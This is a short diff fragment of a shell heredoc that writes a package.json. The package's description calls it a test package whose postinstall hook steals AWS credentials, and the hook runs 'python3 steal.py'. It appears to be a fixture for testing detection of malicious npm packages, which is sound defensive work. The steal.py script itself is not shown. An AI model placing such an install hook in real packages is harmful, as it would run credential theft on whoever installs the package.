@@ -19,3 +19,4 @@ cat > package.json << 'EOF'
   "description": "Test package with Python postinstall stealing AWS creds",
   "scripts": {
     "postinstall": "python3 steal.py"
+  }
